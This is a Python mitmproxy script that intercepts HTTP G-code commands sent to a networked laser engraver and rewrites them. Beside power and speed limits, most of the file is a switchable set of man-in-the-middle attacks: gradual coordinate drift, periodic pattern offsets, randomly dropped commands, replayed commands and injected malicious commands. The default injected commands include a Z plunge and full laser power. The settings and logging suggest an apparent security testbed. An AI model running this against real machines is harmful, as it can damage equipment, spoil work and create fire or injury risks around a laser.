#!/usr/bin/env python3
import re
import urllib.parse
from mitmproxy import http
from datetime import datetime
import math
import random
import hashlib

# Settings from dashboard
ENGRAVER_IP = "192.168.0.170"
LOG_ALL_TRAFFIC = False
ENABLE_SAFETY_LIMITS = True
MAX_FEED_RATE = 3000
MAX_LASER_POWER = 800
MAX_X_COORD = 300
MIN_X_COORD = -10
MAX_Y_COORD = 200
MIN_Y_COORD = -10
MAX_Z_COORD = 50
MIN_Z_COORD = -5
POWER_REDUCTION_FACTOR = 0.5
SPEED_REDUCTION_FACTOR = 0.8
COORDINATE_SCALE_FACTOR = 0.9

# Control injection attack settings
INJECTION_ENABLED = False
INJECTION_TYPE = "none"
DRIFT_RATE = 0.1
DRIFT_DIRECTION = "x"
PATTERN_TYPE = "sine"
PATTERN_AMPLITUDE = 5
PATTERN_FREQUENCY = 0.1
MALICIOUS_COMMANDS = []
DOS_PROBABILITY = 0.1
REPLAY_ATTACK = False
REPLAY_BUFFER_SIZE = 10

# Attack state tracking
class AttackState:
    def __init__(self):
        self.command_count = 0
        self.total_drift = {'x': 0, 'y': 0, 'z': 0}
        self.replay_buffer = []
        self.injection_queue = []
        self.last_position = {'x': 0, 'y': 0, 'z': 0}

attack_state = AttackState()

def log_message(message, level="INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    print(f"[{timestamp}] [{level}] {message}")

def apply_drift_attack(command):
    """Apply gradual position drift to movement commands"""
    global attack_state
    
    modifications = []
    
    for axis in ['X', 'Y', 'Z']:
        coord_match = re.search(f'{axis}([\-\d.]+)', command)
        if coord_match:
            original_val = float(coord_match.group(1))
            
            # Calculate drift based on direction
            if DRIFT_DIRECTION == 'radial':
                # Drift outward from center
                drift = DRIFT_RATE if original_val >= 0 else -DRIFT_RATE
            elif DRIFT_DIRECTION.lower() == axis.lower():
                drift = DRIFT_RATE
            else:
                drift = 0
            
            if drift != 0:
                new_val = original_val + drift
                attack_state.total_drift[axis.lower()] += drift
                command = command.replace(f"{axis}{original_val}", f"{axis}{new_val:.3f}")
                modifications.append(f"{axis} drift: {original_val} -> {new_val:.3f}")
    
    if modifications:
        log_message(f"DRIFT ATTACK: {', '.join(modifications)}", "ATTACK")
    
    return command

def apply_pattern_injection(command):
    """Inject pattern-based modifications to coordinates"""
    global attack_state
    
    modifications = []
    attack_state.command_count += 1
    
    # Calculate pattern value based on command count
    t = attack_state.command_count * PATTERN_FREQUENCY
    
    if PATTERN_TYPE == 'sine':
        offset = PATTERN_AMPLITUDE * math.sin(2 * math.pi * t)
    elif PATTERN_TYPE == 'square':
        offset = PATTERN_AMPLITUDE if (int(t) % 2) == 0 else -PATTERN_AMPLITUDE
    elif PATTERN_TYPE == 'sawtooth':
        offset = PATTERN_AMPLITUDE * (2 * (t % 1) - 1)
    else:
        offset = 0
    
    # Apply pattern to Y axis (perpendicular to typical X movement)
    y_match = re.search(r'Y([\-\d.]+)', command)
    if y_match:
        original_y = float(y_match.group(1))
        new_y = original_y + offset
        command = command.replace(f"Y{original_y}", f"Y{new_y:.3f}")
        modifications.append(f"Pattern injection: Y{original_y} -> Y{new_y:.3f}")
    
    if modifications:
        log_message(f"PATTERN ATTACK: {', '.join(modifications)}", "ATTACK")
    
    return command

def inject_malicious_commands():
    """Return malicious commands to inject"""
    global attack_state
    
    if not MALICIOUS_COMMANDS:
        # Default malicious commands if none specified
        return [
            "G1 Z-1 F100",  # Dangerous Z plunge
            "M3 S1000",     # Max laser power
            "G1 X{} Y{} F5000".format(
                random.uniform(MIN_X_COORD, MAX_X_COORD),
                random.uniform(MIN_Y_COORD, MAX_Y_COORD)
            )  # Random rapid move
        ]
    
    return MALICIOUS_COMMANDS

def apply_dos_attack(command):
    """Randomly drop commands for denial of service"""
    if random.random() < DOS_PROBABILITY:
        log_message(f"DOS ATTACK: DROPPED: {command}", "ATTACK")
        return None  # Drop the command
    return command

def apply_replay_attack(command):
    """Store and replay commands"""
    global attack_state
    
    # Add to replay buffer
    attack_state.replay_buffer.append(command)
    if len(attack_state.replay_buffer) > REPLAY_BUFFER_SIZE:
        attack_state.replay_buffer.pop(0)
    
    # Occasionally replay an old command
    if random.random() < 0.1 and len(attack_state.replay_buffer) > 5:
        replay_cmd = random.choice(attack_state.replay_buffer[:-1])
        log_message(f"REPLAY ATTACK: Injecting: {replay_cmd}", "ATTACK")
        attack_state.injection_queue.append(replay_cmd)
    
    return command

def apply_control_injection(command):
    """Main control injection attack dispatcher"""
    if not INJECTION_ENABLED:
        return command
    
    original_command = command
    
    if INJECTION_TYPE == 'drift':
        command = apply_drift_attack(command)
    elif INJECTION_TYPE == 'pattern':
        command = apply_pattern_injection(command)
    elif INJECTION_TYPE == 'dos':
        command = apply_dos_attack(command)
        if command is None:
            return None  # Command dropped
    elif INJECTION_TYPE == 'replay':
        command = apply_replay_attack(command)
    elif INJECTION_TYPE == 'malicious':
        # Inject malicious commands occasionally
        if random.random() < 0.05:  # 5% chance
            for mal_cmd in inject_malicious_commands():
                attack_state.injection_queue.append(mal_cmd)
                log_message(f"MALICIOUS INJECTION: Queued: {mal_cmd}", "ATTACK")
    
    if command != original_command:
        log_message(f"INJECTED: Original[{original_command}] -> Modified[{command}]", "MODIFIED")
    
    return command

def apply_safety_limits(command):
    if not ENABLE_SAFETY_LIMITS:
        return command
    
    modifications = []
    
    # Speed/Feed rate limits
    feed_match = re.search(r'F(\d+)', command)
    if feed_match:
        feed_rate = int(feed_match.group(1))
        if feed_rate > MAX_FEED_RATE:
            command = command.replace(f"F{feed_rate}", f"F{MAX_FEED_RATE}")
            modifications.append(f"Feed limited: F{feed_rate} -> F{MAX_FEED_RATE}")
    
    # Laser power limits
    power_match = re.search(r'S(\d+)', command)
    if power_match:
        power_level = int(power_match.group(1))
        if power_level > MAX_LASER_POWER:
            command = command.replace(f"S{power_level}", f"S{MAX_LASER_POWER}")
            modifications.append(f"Power limited: S{power_level} -> S{MAX_LASER_POWER}")
    
    # Coordinate boundary checks
    for coord, max_val, min_val in [('X', MAX_X_COORD, MIN_X_COORD), 
                                   ('Y', MAX_Y_COORD, MIN_Y_COORD), 
                                   ('Z', MAX_Z_COORD, MIN_Z_COORD)]:
        coord_match = re.search(f'{coord}([\-\d.]+)', command)
        if coord_match:
            coord_val = float(coord_match.group(1))
            if coord_val > max_val:
                command = command.replace(f"{coord}{coord_val}", f"{coord}{max_val}")
                modifications.append(f"{coord} bounded: {coord_val} -> {max_val}")
            elif coord_val < min_val:
                command = command.replace(f"{coord}{coord_val}", f"{coord}{min_val}")
                modifications.append(f"{coord} bounded: {coord_val} -> {min_val}")
    
    if modifications:
        log_message(f"Safety limits applied: {'; '.join(modifications)}", "SAFETY")
    
    return command

def modify_gcode(command):
    original = command
    modifications = []
    
    # Apply control injection attacks first
    command = apply_control_injection(command)
    if command is None:
        return None  # Command was dropped
    
    # Apply power reduction
    power_match = re.search(r'S(\d+)', command)
    if power_match:
        power_level = int(power_match.group(1))
        new_power = int(power_level * POWER_REDUCTION_FACTOR)
        command = command.replace(f"S{power_level}", f"S{new_power}")
        modifications.append(f"Power reduced: S{power_level} -> S{new_power}")
    
    # Apply speed reduction
    feed_match = re.search(r'F(\d+)', command)
    if feed_match:
        feed_rate = int(feed_match.group(1))
        new_feed = int(feed_rate * SPEED_REDUCTION_FACTOR)
        command = command.replace(f"F{feed_rate}", f"F{new_feed}")
        modifications.append(f"Speed reduced: F{feed_rate} -> F{new_feed}")
    
    # Apply coordinate scaling
    for coord in ['X', 'Y', 'Z']:
        coord_matches = re.finditer(f'{coord}([\-\d.]+)', command)
        for match in reversed(list(coord_matches)):
            coord_val = float(match.group(1))
            new_coord = round(coord_val * COORDINATE_SCALE_FACTOR, 2)
            command = command[:match.start()] + f"{coord}{new_coord}" + command[match.end():]
            modifications.append(f"{coord} scaled: {coord_val} -> {new_coord}")
    
    # Safety warnings
    if "M3" in command:
        log_message(f"LASER ON command detected: {command}", "WARNING")
    if "M5" in command:
        log_message(f"Laser off command: {command}", "SAFE")
    if "M112" in command:
        log_message("EMERGENCY STOP command - passing through unmodified", "EMERGENCY")
        return original
    
    # Apply safety limits
    command = apply_safety_limits(command)
    
    # Log modifications
    if modifications:
        log_message(f"Modifications: {'; '.join(modifications)}")
        log_message(f"Original: {original}")
        log_message(f"Modified: {command}")
    
    return command

def extract_gcode_from_url(url_path):
    try:
        decoded = urllib.parse.unquote(url_path)
        cmd_match = re.search(r'commandText=([^&]+)', decoded)
        if cmd_match:
            return cmd_match.group(1)
    except Exception as e:
        log_message(f"Error extracting G-code from URL: {e}", "ERROR")
    return None

def request(flow: http.HTTPFlow) -> None:
    global attack_state
    
    if LOG_ALL_TRAFFIC:
        log_message(f"Request: {flow.request.method} {flow.request.host}{flow.request.path}")
    
    if flow.request.host != ENGRAVER_IP and ENGRAVER_IP not in flow.request.path:
        return
    
    if "/command?commandText=" in flow.request.path:
        log_message(f"G-code request intercepted: {flow.request.path}")
        
        original_cmd = extract_gcode_from_url(flow.request.path)
        
        if original_cmd:
            # Check for queued injection commands
            if attack_state.injection_queue:
                injected_cmd = attack_state.injection_queue.pop(0)
                log_message(f"INJECTING QUEUED COMMAND: {injected_cmd}", "ATTACK")
                # Prepend the injected command
                modified_cmd = injected_cmd + ";" + original_cmd
            else:
                modified_cmd = modify_gcode(original_cmd)
            
            if modified_cmd is None:
                # Command was dropped (DoS attack)
                flow.response = http.Response.make(
                    200,
                    b"OK",
                    {"Content-Type": "text/plain"}
                )
                return
            
            if original_cmd != modified_cmd:
                decoded_path = urllib.parse.unquote(flow.request.path)
                new_path = decoded_path.replace(original_cmd, modified_cmd)
                flow.request.path = urllib.parse.quote(new_path, safe='/?=&')
                log_message(f"URL updated with modified command", "MODIFIED")
            else:
                log_message("No modifications applied to G-code", "PASSTHROUGH")

def response(flow: http.HTTPFlow) -> None:
    if flow.request.host == ENGRAVER_IP or ENGRAVER_IP in flow.request.path:
        if "/command?commandText=" in flow.request.path:
            status = flow.response.status_code
            log_message(f"Engraver response: HTTP {status}")

def error(flow: http.HTTPFlow) -> None:
    log_message(f"Flow error: {flow.error}", "ERROR")

# Startup message
log_message("=" * 60)
log_message("G-Code Control Injection System Active", "STARTUP")
log_message(f"Target: {ENGRAVER_IP}")
log_message(f"Attack Mode: {INJECTION_TYPE if INJECTION_ENABLED else 'Monitoring Only'}")
log_message(f"Safety Limits: {ENABLE_SAFETY_LIMITS}")
log_message("=" * 60)
